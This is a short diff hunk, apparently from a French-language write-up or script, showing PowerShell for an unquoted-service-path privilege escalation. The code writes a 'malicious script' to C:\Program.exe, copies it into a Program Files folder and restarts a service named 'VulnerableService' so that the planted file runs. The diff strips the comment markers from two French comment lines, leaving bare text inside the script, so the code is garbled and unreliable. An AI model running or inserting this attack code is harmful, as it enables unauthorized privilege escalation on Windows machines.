@@ -510,10 +510,10 @@ Set-Content -Path $path -Value "Ce fichier a été créé via une exploitation d
 
 Set-Content -Path "C:\Program.exe" -Value $maliciousScript
 
-# Copier le script malveillant dans le répertoire cible
+Copier le script malveillant dans le répertoire cible
 Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.exe"
 
-# Redémarrer le service vulnérable
+Redémarrer le service vulnérable
 Restart-Service -Name "VulnerableService"
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
